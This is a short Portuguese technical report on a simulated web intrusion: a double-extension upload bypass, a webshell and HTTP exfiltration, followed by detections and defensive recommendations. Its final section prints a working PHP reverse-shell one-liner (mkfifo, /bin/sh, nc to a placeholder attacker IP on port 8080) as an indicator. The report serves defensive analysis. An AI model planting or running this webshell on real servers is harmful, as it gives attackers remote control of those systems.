# Relatório Técnico — WebStrike (simulado)
**Autor:** Ricardo Almeida · **GitHub:** @The-Black-Needles · **Data:** 29/09/2025

## Sumário
Upload com **dupla extensão** contornou validação; **webshell** executou **reverse shell** (saída :8080); evidências de **exfil HTTP**.

## Evidências (rede)
- Filtros e streams HTTP indicam POST multipart para endpoint de upload.
- Acesso subsequente a artefato com dupla extensão (generalizado).
- Conexões outbound para porta alta (generalizado como 8080).
- Picos de POST/bytes em 443 compatíveis com exfiltração.

## Detecções
- Sigma: `web_upload_double_extension.yml`
- KQL: `reverse_shell_port_8080.kql`, `web_exfil_high_volume.kql`

## Recomendações
- WAF anti-dupla extensão; **no-exec** em `/uploads`.
- Controle de egress para portas não utilizadas (ex.: 8080).
- Monitoramento de exfiltração e DLP/inspeção em 443.

## Padrão de reverse shell (generalizado)
Identifiquei sequência **FIFO + /bin/sh + nc** em PHP, que estabelece uma **conexão de saída** ao controlador:

```php
<?php system("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 8080 >/tmp/f"); ?>
```

- **Indicadores:** criação de FIFO em `/tmp`, invocação de shell interativo e `nc` apontando para **porta 8080**.
- **Uso defensivo:** bloquear/monitorar **egress 8080**, varrer uploads por **dupla extensão** e **padrões de comando** (quando body é registrado).
